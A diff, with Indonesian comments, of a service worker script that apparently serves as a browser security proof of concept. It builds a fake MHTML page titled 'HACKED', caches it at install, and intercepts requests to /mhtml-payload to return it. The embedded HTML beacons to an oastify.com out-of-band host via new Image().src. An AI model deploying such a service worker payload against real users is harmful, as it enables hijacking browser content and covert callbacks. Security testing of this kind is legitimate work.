@@ -1,8 +1,7 @@
-// sw.js - Service Worker yang menyajikan MHTML
 const MHTML_BOUNDARY = '----MultipartBoundary--SHADOWCORE';
 const CACHE_NAME = 'mhtml-cache-v1';
 
-// MHTML payload (inner HTML)
+// Inner HTML yang akan dieksekusi
 const INNER_HTML = `<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>HACKED</title></head>
@@ -18,7 +17,7 @@ new Image().src = 'http://ueclik1jyoox9ewpzs6yg1fkmbs2gtjh8.oastify.com/sw-mhtml
 </body>
 </html>`;
 
-// Build MHTML string
+// Bangun string MHTML lengkap
 function buildMHTML() {
   return `From: <Saved by Blink>\r\n` +
     `Snapshot-Content-Location: file:///C:/fake/path.html\r\n` +
@@ -40,7 +39,7 @@ function buildMHTML() {
     `--${MHTML_BOUNDARY}--\r\n`;
 }
 
-// Install: cache MHTML response
+// Install: cache MHTML
 self.addEventListener('install', (event) => {
   self.skipWaiting();
   event.waitUntil(
@@ -63,7 +62,7 @@ self.addEventListener('activate', (event) => {
   event.waitUntil(self.clients.claim());
 });
 
-// Fetch: intercept request ke /mhtml-payload
+// Fetch: intersepsi request ke /mhtml-payload
 self.addEventListener('fetch', (event) => {
   if (event.request.url.includes('/mhtml-payload')) {
     event.respondWith(
